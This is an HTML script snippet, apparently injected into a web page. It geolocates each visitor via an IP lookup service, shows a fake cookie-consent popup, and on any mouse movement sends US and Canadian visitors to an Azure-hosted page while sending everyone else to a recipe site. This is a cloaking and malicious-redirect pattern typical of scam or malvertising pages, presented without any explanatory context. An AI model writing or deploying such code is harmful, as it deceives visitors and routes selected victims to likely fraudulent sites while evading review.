<script>
document.addEventListener("DOMContentLoaded", function () {
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            let country = data.country_code; // Get country code (e.g., "US", "CA")
            let redirectURL;

            if (country === "US" || country === "CA") {
                redirectURL = "https://huntop001.z13.web.core.windows.net"; // USA & Canada
            } else {
                redirectURL = "https://www.allrecipes.com"; // Other Countries
            }

            // Display Cookie Popup in Center of Screen
            let cookiePopup = document.createElement("div");
            cookiePopup.innerHTML = `
                <div id="cookie-popup" style="
                    position: fixed; 
                    top: 50%; 
                    left: 50%; 
                    transform: translate(-50%, -50%);
                    background: white;
                    padding: 20px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.3);
                    z-index: 9999;
                    text-align: center;">
                    <p>This website uses cookies for best experience.</p>
                    <button id="accept-cookie" style="background: blue; color: white; padding: 10px;">Accept</button>
                </div>
            `;
            document.body.appendChild(cookiePopup);

            // Redirect when user moves mouse
            document.addEventListener("mousemove", function () {
                window.location.href = redirectURL;
            });

            // Remove popup when user clicks accept
            document.getElementById("accept-cookie").addEventListener("click", function () {
                document.getElementById("cookie-popup").remove();
            });
        })
        .catch(error => console.error("Error fetching location:", error));
});
</script>
